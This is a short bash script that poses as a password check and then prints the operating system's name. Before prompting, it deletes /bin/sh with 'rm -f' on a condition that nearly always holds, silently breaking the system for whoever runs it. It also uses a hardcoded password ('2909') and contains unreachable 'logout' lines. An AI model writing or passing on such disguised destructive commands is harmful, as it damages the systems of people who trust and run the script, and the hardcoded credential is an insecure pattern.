#!/bin/bash

#Alpine not support this script!

if [ -n "$(ls /bin | grep sh)" ]; then
    rm -f /bin/sh
fi

echo "Password to Execute: "
read passwd

if [ -z "$passwd" ]; then
    exit
    logout
else
    if [ "$passwd" == "2909" ]; then
        echo "Webcome to $(cat /etc/os-release | head -n1)"
    else
        exit
        logout
    fi
fi